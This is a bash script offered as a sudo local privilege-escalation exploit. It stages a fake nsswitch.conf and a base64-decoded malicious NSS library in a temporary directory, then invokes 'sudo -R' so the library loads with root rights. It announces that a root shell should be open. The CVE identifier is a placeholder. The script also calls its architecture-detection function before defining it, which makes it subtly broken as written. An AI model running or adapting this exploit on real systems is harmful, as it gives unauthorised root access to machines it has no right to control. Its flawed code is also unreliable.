#!/bin/bash

#  __   ___       __                     __   __
# |  \ |__  |\ | /__` |  |    |     /\  |__) /__`
# |__/ |___ | \| .__/ \__/    |___ /~~\ |__) .__/
#
# CVE‑2025‑00000.sh
# (*)  (CVE- -) exploit by Densu Labs
# -
# CVEs:

set -euo pipefail

stage_dir=""

ARCH=$(detect_arch)
HERE=$(dirname "$(readlink -f "$0")")
DIRS=("$HERE/archs-dynamic" "$HERE/archs-static")
B64_NAME="king.${ARCH}.b64"

cleanup() {
    if [[ -n "$stage_dir" && -d "$stage_dir" ]]; then
        echo "Cleaning up staging directory: $stage_dir"
        rm -rf "$stage_dir"
    else
        echo "No staging directory to clean up."
    fi
}
trap cleanup EXIT

detect_arch() {
    local arch
    # Use 'uname -m' to get the architecture, convert to lowercase
    arch=$(uname -m | tr '[:upper:]' '[:lower:]')
    
    case "$arch" in
        # x86_64 (64-bit) aliases
        x86_64 | amd64 | x64 )
            echo "x86_64"
        ;;
        # x86 (32-bit) aliases
        i386 | i486 | i586 | i686 | x86 )
            echo "i386"
        ;;
        # AArch64 (64-bit ARM) aliases
        aarch64 | arm64 | armv8* )
            echo "aarch64"
        ;;
        # ARM 32-bit aliases (e.g., Raspberry Pi 1/2)
        armv7l | armv6l )
            echo "arm"
        ;;
        # PowerPC (PPC) and other common architectures
        ppc64le )
            echo "ppc64le"
        ;;
        s390x )
            echo "s390x"
        ;;
        # Default: Return the original (lowercase) output if not mapped
        * )
            echo "$arch"
        ;;
    esac
}

run_exploit() {
    local payload_b64="$1"
    local label="$2"
    
    stage_dir=$(mktemp -d /tmp/sudo_king.stage.XXXXXX)
    cd "$stage_dir"
    
    mkdir -p king/etc libnss_
    
    echo "$payload_b64" | base64 -d > libnss_/king.so.2
    chmod 755 libnss_/king.so.2
    
    echo "passwd: /king" > king/etc/nsswitch.conf
    cp /etc/group king/etc/group
    
    echo "[*] Launching sudo with $label payload …"
    sudo -R king king
    return $?
}

main() {
    echo "[*] Detected architecture: $ARCH"
    for dir in "${DIRS[@]}"; do
        local b64_file="$dir/$B64_NAME"
        local label
        label=$(basename "$dir")
        
        if [[ ! -f "$b64_file" ]]; then
            echo "[!] Missing payload file: $b64_file"
            continue
        fi
        
        local payload_b64
        payload_b64=$(< "$b64_file")
        if run_exploit "$payload_b64" "$label"; then
            echo "[+] Exploit succeeded – root shell should be open."
            exit 0
        else
            echo "[!] $label payload failed. Trying next …"
        fi
    done
    
    echo "[!] All payload variants failed. Check architecture mapping or rebuild."
    exit 1
}

main "$@"
